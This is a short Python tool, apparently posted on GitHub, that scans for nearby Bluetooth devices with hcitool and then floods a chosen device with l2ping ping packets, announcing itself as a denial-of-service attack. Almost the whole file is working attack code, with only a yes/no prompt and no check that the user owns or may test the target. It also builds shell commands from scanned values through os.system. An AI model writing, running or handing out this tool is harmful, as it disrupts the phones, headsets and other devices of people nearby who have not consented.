import os
import subprocess

def scan_devices():
    try:
        print("Scanning...wait.")
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = output.splitlines()
        devices = {}
        for line in lines[1:]:
            info = line.split()
            mac = info[0]
            device_name = ' '.join(info[2:])
            devices[mac] = device_name
        return devices
    except subprocess.CalledProcessError as e:
        print("Error:", e.output)
        return None

def print_device_info(devices):
    if devices:
        print("/_id/______/MAC_Address/____/Device_Name__/")
        print("---------------------------------------")
        for idx, (mac, name) in enumerate(devices.items()):
            print(f"| {idx}  |   {mac}  |   {name}")
        print("---------------------------------------")
    else:
        print("No devices found idk maybe try again.")

def perform_dos(target_mac):
    print(f"Performing DoS attack on device with MAC address: {target_mac}")
    os.system(f"l2ping -s 600 -f {target_mac}")

def main():
    print("""    _   _  _ _____ ___   __  __   _   _  _ ___ _    ___ 
   /_\ | \| |_   _|_ _| |  \/  | /_\ | \| | __| |  | __|
  / _ \| .` | | |  | |  | |\/| |/ _ \| .` | _|| |__| _| 
 /_/ \_\_|\_| |_| |___|_|_|  |_/_/ \_\_|\_|___|____|___|
                     |___|""")
    print("This is a simple Python script to scan for Bluetooth devices and DOS them with l2ping tool.")
    print("Made by noobmadman")
    print("https://github.com/noobmadman")
    
    accept = input("Do you want to do this? (y/n): ").lower()
    if accept != "y":
        print("Exiting...")
        return
    
    devices = scan_devices()
    if devices:
        print_device_info(devices)
        target = input("Enter the ID or MAC address of the target device: ")
        if target.isdigit() and int(target) < len(devices):
            target_mac = list(devices.keys())[int(target)]
            perform_dos(target_mac)
        elif target in devices:
            perform_dos(target)
        else:
            print("Invalid ID or MAC address.")
    else:
        print("No devices found idk maybe try again.")

if __name__ == "__main__":
    main()
